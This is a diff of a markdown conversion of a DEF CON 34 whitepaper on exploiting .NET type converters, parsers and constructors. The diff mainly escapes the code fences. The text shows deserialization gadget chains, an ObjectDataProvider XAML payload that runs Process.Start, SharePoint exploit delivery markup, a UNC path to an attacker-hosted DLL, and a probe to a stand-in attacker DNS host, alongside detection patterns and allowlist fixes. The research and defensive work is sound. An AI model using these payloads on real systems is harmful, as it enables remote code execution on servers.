@@ -4,23 +4,28 @@ speakers: ["Oleksandr Mirosh"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Oleksandr Mirosh - Transformers Dark Side of the Type - Weaponizing the Conversion Layer - Sideofthe WP v3.pdf"
 pages: 67
 sha256: "5cce4f3202669d916c7a052b7fc2c96159ba655ee190fcf0462d53c8485e51e1"
-text_chars: 155140
+text_chars: 155216
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-12T00:25:43Z"
+converted_at: "2026-08-12T06:39:47Z"
 ---
 # Transformers Dark Side of the Type - Weaponizing the Conversion Layer
 
 **Speakers:** Oleksandr Mirosh  
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Oleksandr Mirosh - Transformers Dark Side of the Type - Weaponizing the Conversion Layer - Sideofthe WP v3.pdf` (67 pages)
+
 
 ## Slide 1
 
@@ -435,11 +440,11 @@ GAC resolution by strong name (
 
 Framework)
 
-```
+\```
 1// .NET Framework: resolved from the GAC, no project reference required
 2Type.GetType("System.Windows.Data.ObjectDataProvider, PresentationFramework,
 Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
-```
+\```
 
 The string carries the simple name, version, culture, and public key token; the loader matches it against the GAC and brings the assembly in. From the attacker's side this is the ideal case: the whole installed machine is a pantry of gadgets, and the transformer is the key that opens it. It is no accident that the most impactful transformer attacks to date have landed on .NET Framework, where the available set is at its widest [5].
 
@@ -498,12 +503,12 @@ Same resolution on
 
 Core returns null
 
-```
+\```
 1// .NET 8 ASP.NET Core, PresentationFramework not referenced
 2Type.GetType("System.Windows.Data.ObjectDataProvider, PresentationFramework,
 Version=8.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
 3// returns null. The assembly is not in this application's shared framework.
-```
+\```
 
 Part two: the application and its dependencies. Chosen by the developer, so it differs with every application. Every NuGet package the application references, and every transitive dependency those packages pull in, is recorded in `deps.json` and resolvable by name [23]. This is where the narrowing of modern .NET quietly undoes itself. A base ASP.NET Core process carries no `PresentationFramework` , but the moment it references a library that does, directly or through some package deep in its dependency graph, those desktop gadgets are back in reach. The core libraries in `Microsoft.NETCore.App` are always present, but they are rarely the prize; the dangerous gadgets usually arrive through the dependencies the application pulled in. The hunt on modern .NET therefore shifts. It is no longer "what is installed on this machine," but "what did this application choose to ship" - a question the following sections keep returning to.
 
@@ -591,12 +596,12 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 12// Instantiating a type from the loaded assembly runs its code
 13return asm.CreateInstance("Plugin");
 14    }
 15}
-```
+\```
 
 Now trace the two inputs through. The attacker sets `inputTargetTypeName` to `Plugin` and `inputString` to the path of an assembly they control. The sink resolves the type, `GetConverter()` returns the `PluginConverter` the type declares, and `ConvertFromString()` runs its body: it loads the attacker's assembly and instantiates a type from it, which runs the attacker's code. The application wrote no payload and loaded nothing itself. It only asked a type to convert a string, and the type it was told to use brought the code with it. This is what the article’s title means: _the type selects the code_ .
 
@@ -718,7 +723,7 @@ Richer outcomes, up to code execution, need the named type to be one whose strea
 
 ResourceSet / ResourceReader stand up a BinaryFormatter
 
-```
+\```
 1// System.Resources.ResourceSet
 2public ResourceSet(Stream stream)
 3{
@@ -748,7 +753,7 @@ ResourceReader.TypeLimitingDeserializationBinder();
 24this._objFormatter = binaryFormatter;
 25/*...*/
 26}
-```
+\```
 
 `ResourceSet` 's `ReadResources` enumerates the set and pulls each value, and each value access drives the `ResourceReader` through `GetValueForNameIndex` **→** `LoadObjectV2` **→ _** `LoadObjectV2` **→** `DeserializeObject` , which reaches the formatter:
 
@@ -768,7 +773,7 @@ Black Hat USA 2026
 
 Value access drives ResourceReader toward the formatter
 
-```
+\```
 1// System.Resources.ResourceSet
 2protectedvirtualvoid ReadResources()
 3{
@@ -805,13 +810,13 @@ Value access drives ResourceReader toward the formatter
 34    }
 35/*...*/
 36}
-```
+\```
 
 **Listing 9.  C#**
 
 LoadObjectV2 / _LoadObjectV2
 
-```
+\```
 1// System.Resources.ResourceReader
 2internal object LoadObjectV2(int pos, out ResourceTypeCode typeCode)
 3{
@@ -830,7 +835,7 @@ LoadObjectV2 / _LoadObjectV2
 16// System.Resources.ResourceReader
 17private object _LoadObjectV2(int pos, out ResourceTypeCode typeCode)
 18{
-```
+\```
 
 OpenText Fortify
 
@@ -844,7 +849,7 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 19this._store.BaseStream.Seek(this._dataSectionOffset + (long)pos,
 SeekOrigin.Begin);
 20    typeCode = (ResourceTypeCode)this._store.Read7BitEncodedInt();
@@ -857,13 +862,13 @@ BadImageFormatException(Environment.GetResourceString("BadImageFormat_TypeMismat
 26    int typeIndex = typeCode - ResourceTypeCode.StartOfUserTypes;
 27returnthis.DeserializeObject(typeIndex);
 28}
-```
+\```
 
 ###### **Listing 10.  C#**
 
 DeserializeObject clears the binder and calls Deserialize
 
-```
+\```
 1// System.Resources.ResourceReader
 2private object DeserializeObject(int typeIndex)
 3{
@@ -887,7 +892,7 @@ DeserializeObject clears the binder and calls Deserialize
 21    }
 22return obj;
 23}
-```
+\```
 
 For a type outside the reader's safe set, `DeserializeObject` clears the binder and calls `Deserialize` on attacker-controlled bytes. That is an unrestricted `BinaryFormatter` deserialization of data under attacker control. `BinaryFormatter` invokes serialization callbacks on the reconstructed types, the entry point we documented in 2017 [5], and from there we can reuse a known gadget to reach command execution [5][7].
 
@@ -897,10 +902,10 @@ For a type outside the reader's safe set, `DeserializeObject` clears the binder 
 
 Embedding a BinaryFormatter payload in a .resx data node
 
-```
+\```
 1<dataname="BinaryFormatter_Payload"mimetype="application/x-
 microsoft.net.object.binary.base64">
-```
+\```
 
 OpenText Fortify
 
@@ -914,10 +919,10 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 2<value>{BASE64EncodedBinaryFormatterPayload}</value>
 3</data>
-```
+\```
 
 Save and compile. Visual Studio writes the compiled `.resources` file to the project's `/obj` folder. Host it at the path that is placed in the `ResXFileRef` string. The converter reads it, `ResourceSet` deserializes it, and the server runs the attacker-controlled command.
 
@@ -933,13 +938,13 @@ Its constructor is the most direct of the stream-constructor gadgets:
 
 XamlImageInfo: XamlReader.Load in the constructor
 
-```
+\```
 1// System.Activities.Presentation.Internal.ManifestImages.XamlImageInfo
 2public XamlImageInfo(Stream stream)
 3{
 4this._image = XamlReader.Load(stream);
 5}
-```
+\```
 
 OpenText Fortify
 
@@ -963,14 +968,14 @@ Its public stream constructor wraps the stream in a definition context:
 
 WorkflowServiceBehavior stream constructor
 
-```
+\```
 1// System.ServiceModel.Description.WorkflowServiceBehavior
 2public WorkflowServiceBehavior(Stream workflowDefinitionStream)
 3    : this(new StreamedWorkflowDefinitionContext(workflowDefinitionStream, null,
 null))
 4{
 5}
-```
+\```
 
 The deserialization is not in this constructor, and that is what makes the gadget easy to miss. `StreamedWorkflowDefinitionContext` only copies the stream into a byte array; the load is deferred behind its `WorkflowName` property. But the internal constructor reads that property during construction:
 
@@ -984,7 +989,7 @@ The internal constructor reads WorkflowName during construction
 
 DeSerizalizeDefinition runs the XOML deserializer
 
-```
+\```
 1// System.Workflow.Runtime.StreamedWorkflowDefinitionContext
 2private Activity DeSerizalizeDefinition(byte[] workflowDefinition, byte[]
 ruleDefinition)
@@ -992,7 +997,7 @@ ruleDefinition)
 4/*...*/
 5    XmlReader reader = XmlReader.Create(stream);
 6/*...*/
-```
+\```
 
 OpenText Fortify
 
@@ -1287,12 +1292,12 @@ The string is a file path. `Parse` opens it with `File.OpenRead` , and because t
 
 XDocument.Parse: a timing oracle
 
-```
+\```
 1publicstatic XDocument Parse(string text)
 2{
 3return XDocument.Parse(text, LoadOptions.None);
 4}
-```
+\```
 
 It does not run code or resolve a type — it just parses the string into an XML tree, with DTD processing off by default. But it is still a real XML parser, so it remains a surface worth probing for new vectors, and it is available everywhere. Its immediate value is as a timing oracle: parse time scales with input size and nesting, so a heavy XML payload measured against a light baseline confirms, by response time alone, that the string reached the `XDocument.Parse` gadget. The trigger is minimal: a type name of `System.Xml.Linq.XDocument` and, as the value, a large or deeply nested document against a small control.
 
@@ -1376,7 +1381,7 @@ ResourceSet(string) opens the path and reaches
 
 BinaryFormatter
 
-```
+\```
 1// System.Resources.ResourceSet
 2public ResourceSet(string fileName) : this()
 3{
@@ -1394,7 +1399,7 @@ BinaryFormatter
 14        Encoding.UTF8);
 15this.ReadResources();
 16}
-```
+\```
 
 From there the chain is the one traced in Section 3.2, ending in an unrestricted `BinaryFormatter.Deserialize` .
 
@@ -1406,14 +1411,14 @@ From there the chain is the one traced in Section 3.2, ending in an unrestricted
 
 WorkflowServiceBehavior(string) reads the file at construction
 
-```
+\```
 1// System.ServiceModel.Description.WorkflowServiceBehavior
 2public WorkflowServiceBehavior(string workflowDefinitionPath)
 3    : this(workflowDefinitionPath, null) { }
 4
 5public WorkflowServiceBehavior(string workflowDefinitionPath, string
 ruleDefinitionPath)
-```
+\```
 
 OpenText Fortify
 
@@ -1578,7 +1583,7 @@ This is a setter that does more than store its value:
 
 Synthetic setter that loads an assembly
 
-```
+\```
 1// A type whose setter acts on the value instead of just storing it
 2classLoader
 3{
@@ -1589,7 +1594,7 @@ Synthetic setter that loads an assembly
 8        }
 9    }
 10}
-```
+\```
 
 Trace it through. The attacker sets the type name to `Loader` and supplies a property bag of `{"AssemblyPath":"\\attacker\share\evil.dll"}` . The sink creates the `Loader` , then calls
 
@@ -1619,12 +1624,12 @@ Its purpose is to call a method on an object and expose the result for data bind
 
 ObjectDataProvider: setting properties reaches InvokeMember
 
-```
+\```
 1publicvoid set_MethodName(string value)
 2{
 3this._methodName = value;
 4this.OnPropertyChanged("MethodName");
-```
+\```
 
 OpenText Fortify
 
@@ -1638,7 +1643,7 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 5if (!base.IsRefreshDeferred)
 6base.Refresh();       // -> BeginQuery -> QueryWorker ->
 InvokeMethodOnInstance
@@ -1653,7 +1658,7 @@ InvokeMethodOnInstance
 15        BindingFlags.OptionalParamBinding,
 16null, this._objectInstance, array, CultureInfo.InvariantCulture);
 17}
-```
+\```
 
 Assigning the properties drives straight to `InvokeMember` on an attacker-chosen method of an attacker-chosen object. That is what made it our universal gadget in 2017: it fit almost any conversion scenario, because its properties can be combined three ways.
 
@@ -1811,7 +1816,7 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 29      XmlNode xmlNode = (XmlNode)obj2;
 30      XmlElement xmlElement = xmlNode as XmlElement;
 31if (xmlElement != null)
@@ -1855,7 +1860,7 @@ TypeDescriptor.GetConverter(type).ConvertFromString(null,
 workflowAssociation.ParentWeb.Locale, text2);
 67/*...*/
 68}
-```
+\```
 
 Two attacker-controlled values met on the last line. The Type came from the `Initiation_Parameters` XML carried by `workflowAssociation` . The string, to be converted, came from the insert arguments. `Type.GetType(attribute2)` applied no restriction, so the type was whatever the attacker named, and `ConvertFromString` ran that type's converter against the attacker-controlled string. What remained was to reach this method and place a type of the attacker’s choosing in the workflow association. It took four steps: define a workflow association carrying the attacker-controlled Type, bind it to a list, apply it, and insert an item to fire the conversion.
 
@@ -1918,14 +1923,14 @@ Microsoft's patch constrained the type before the conversion ran. `Insert()` now
 
 The patch: IsAllowConvertType before conversion
 
-```
+\```
 1// Microsoft.SharePoint.WebControls.SPWorkflowDataSourceView
 2if (!SPUtility.IsAllowConvertType(type))
 3{
 4thrownew InvalidOperationException("Type " + type + " is not allowed.");
 5}
 6hashtable[attribute] = TypeDescriptor.GetConverter(type).ConvertFromString(...);
-```
+\```
 
 `IsAllowConvertType` checks against a hardcoded allowlist:
 
@@ -1980,7 +1985,7 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 4/*...*/
 5    bool useParseMethod = true;
 6    object ret = null;
@@ -2039,7 +2044,7 @@ s_parseMethodTypesWithSOP);
 57/*...*/
 58return ret;
 59}
-```
+\```
 
 OpenText Fortify
 
@@ -2063,11 +2068,11 @@ This may look hard to reach. `ObjectFromString` runs while the parser builds a c
 
 SafeControl allows every type in the Microsoft.SharePoint namespace
 
-```
+\```
 1<SafeControlAssembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral,
 PublicKeyToken=71e9bce111e9429c"Namespace="Microsoft.SharePoint"TypeName="*"
 Safe="True"AllowRemoteDesigner="True"SafeAgainstScript="False"/>
-```
+\```
 
 Among them is a generic type, `Microsoft.SharePoint.ProxyRequestResponse` <T>:
 
@@ -2116,7 +2121,7 @@ ObjectDataProvider XAML payload
 
 > Process.Start
 
-```
+\```
 1<RS:ResourceDictionary
 2xmlns:RS="clr-namespace:System.Windows;assembly=PresentationFramework"
 3xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
@@ -2136,7 +2141,7 @@ namespace:System.Windows.Data;assembly=PresentationFramework"
 15ObjectInstance="{StaticResource proc01}"
 16MethodName="Start"/>
 17</RS:ResourceDictionary>
-```
+\```
 
 With the type and the payload in hand, what remained was delivery. We called the `ExecuteProxyUpdates` web service, passing an `UpdateTransaction` whose `Register` directive bound a tag prefix to a namespace string that named `ProxyRequestResponse` < `XamlServices` > as the control type:
 
@@ -2144,7 +2149,7 @@ With the type and the payload in hand, what remained was delivery. We called the
 
 UpdateTransaction Register directive smuggling the generic
 
-```
+\```
 1<UpdateTransaction>
 2<UpdateType="Document">
 3<Document>
@@ -2155,7 +2160,7 @@ UpdateTransaction Register directive smuggling the generic
 8                   Culture=neutral,PublicKeyToken=71e9bce111e9429c,Version=16.0.0"
 9Assembly=" "/>
 10          ...
-```
+\```
 
 OpenText Fortify
 
@@ -2169,11 +2174,11 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 11</Document>
 12</Update>
 13</UpdateTransaction>
-```
+\```
 
 The ASPX markup then instantiated the control and passed our XAML as the value attribute:
 
@@ -2181,9 +2186,9 @@ The ASPX markup then instantiated the control and passed our XAML as the value a
 
 The instantiated control passes the XAML as value
 
-```
+\```
 1<asp2:0runat="server"value='{XAML_PAYLOAD}'/>
-```
+\```
 
 The parser resolved `XamlServices` as the type argument, found `XamlServices.Parse()` by reflection, invoked it with our payload string, and the server executed our command.
 
@@ -2276,9 +2281,9 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 11select c, "Type resolved from external input"
-```
+\```
 
 Or as a text search:
 
@@ -2367,11 +2372,11 @@ Or as a text search:
 
 TypeConverter sink (text search)
 
-```
+\```
 1# find the resolve-and-convert pair, then check the type is input-driven
 2GetConverter\s*\(
 3ConvertFrom(String|InvariantString)?\s*\(
-```
+\```
 
 The inverse hunt looks for the dangerous converters themselves: any `TypeConverter` subclass whose conversion body does more than build a value. The dangerous logic sits in an overridden `ConvertFrom` , `ConvertFromString` , or `ConvertFromInvariantString` ; the gadget condition is a body that reaches something from the dangerous list (Listing 47).
 
@@ -2381,11 +2386,11 @@ The signature is easy to grep: an override of one of those methods whose body re
 
 TypeConverter gadget: dangerous ConvertFrom overrides
 
-```
+\```
 1# consider every override of a TypeConverter converting method:
 2#   ConvertFrom / ConvertFromString / ConvertFromInvariantString
 3override\s+\w+\s+ConvertFrom(String|InvariantString)?\b
-```
+\```
 
 OpenText Fortify
 
@@ -2448,10 +2453,10 @@ Find the static parse method, then read the body.
 
 Parse gadget: dangerous static Parse/TryParse
 
-```
+\```
 1# find static Parse/TryParse methods, then read the body for a dangerous call
 2static\s+\w[\w<>,\s]*\s+(Parse|TryParse)\s*\(
-```
+\```
 
 A hit is a candidate gadget: name its type at a sink from the first hunt, and the string is handed to a static factory that loads, resolves, or fetches on the attacker's behalf.
 
@@ -2496,12 +2501,12 @@ Or as a text search:
 
 Constructor sink (text search)
 
-```
+\```
 1# construction of a resolved type from arguments; read whether the type is input-
 driven
 2Activator\.CreateInstance\s*\(
 3GetConstructor\s*\([\s\S]*?\.Invoke\s*\(
-```
+\```
 
 The inverse hunt looks for the dangerous types themselves: any type whose singleargument string constructor acts on the string instead of storing it — a `.ctor(string)` whose body reaches something from the dangerous list (Listing 47).
 
@@ -2514,10 +2519,10 @@ Constructor gadget: single
 
 string constructors
 
-```
+\```
 1# find single-string constructors, then read the body for a dangerous call
 2public\s+\w+\s*\(\s*string\s+\w+\s*\)     # .ctor(string)
-```
+\```
 
 A hit is a candidate gadget: name its type at a sink from the first hunt, and the object cannot be built without the constructor running its load, resolve, or fetch on the attacker's string.
 
@@ -2618,9 +2623,9 @@ Mirosh
 
 Black Hat USA 2026
 
-```
+\```
 2\b(?:System|Microsoft|MyApp)\.[A-Za-z0-9_]+(?:[.+][A-Za-z0-9_]+)*\b
-```
+\```
 
 A hit here is reconnaissance, not a finding. `System.Int32` in a form field is ordinary; it only tells you a transformer may be in use and where its input arrives.
 
@@ -2630,7 +2635,7 @@ The second hunt is narrower. It looks for what a value has no ordinary reason to
 
 Detecting an attack: gadget names, markup, external refs
 
-```
+\```
 1# gadget type names documented in this paper
 2(ObjectDataProvider|ResXFileRef|XamlReader|XamlServices)
 3
@@ -2639,7 +2644,7 @@ Detecting an attack: gadget names, markup, external refs
 6
 7# an external reference in a value: UNC or URL
 8\\\\[A-Za-z0-9._-]+\\[^\s"']+|[a-z]+://[^\s"']+
-```
+\```
 
 The first pattern is exact: these names do not appear in legitimate data. The others are heuristic — markup or a UNC path in a field that should hold a scalar is the anomaly, and the anomaly is the signal.
 
@@ -2653,10 +2658,10 @@ The hunt can also go from passive to active. Once a spot is found where input be
 
 Active probe: type + value for a TypeConverter path
 
-```
+\```
 1__TYPE_FIELD__  = System.Windows.Input.Cursor, PresentationCore, ...
 2__VALUE_FIELD__ = \\probe.attacker-dns.example\a.cur
-```
+\```
 
 An inbound DNS query `for probe.attacker-dns.example` is proof the value reached the converter — but proof of only this transformer. From the outside, the tester rarely knows
 
@@ -2831,7 +2836,7 @@ Everything downstream, the converter, the `Parse` , the constructor, the accesso
 
 A validated conversion service
 
-```
+\```
 1sealedclassSafeConversion
 2{
 3readonly IReadOnlyDictionary<string, Type> _permitted;   // name -> Type,
@@ -2849,7 +2854,7 @@ first
 13return TypeDescriptor.GetConverter(t).ConvertFromString(value);
 14    }
 15}
-```
+\```
 
 The registry is populated at startup with the types the application actually converts. Because it maps names to already-resolved Type objects the developer chose, the input name is only ever a key lookup; it never reaches `Type.GetType,` so neither the assembly-resolver nor the static-initializer path can fire.
 
@@ -2879,7 +2884,7 @@ values a conversion exists to handle. The marker interface is therefore the exte
 
 Allowlist + marker interface combined
 
-```
+\```
 1staticreadonly HashSet<string> AllowedPrimitives = new()
 2{
 3"System.Int32", "System.Int64", "System.Double",
@@ -2901,7 +2906,7 @@ typeof(IPermittedConversion).IsAssignableFrom(candidate))
 18
 19thrownew SecurityException($"Type not permitted: {typeName}");
 20}
-```
+\```
 
 The strength of the arrangement is what each half excludes. The framework gadgets in this paper, `XamlReader` , `ObjectDataProvider` , `ResXFileRef` , are not on the primitive allowlist, and they do not implement the application's interface and never will, and neither will a gadget discovered next year. One caveat keeps the interface half honest: testing the marker resolves the candidate type, and resolution is itself dangerous, so that resolution must be constrained, to the application's own assemblies, with the name sanitized before it, for the reason the resolve-then-check warning gave. The allowlist half needs no such caveat: it checks the name against the permitted set before resolving anything, so it never resolves a name that has not already passed the check.
 
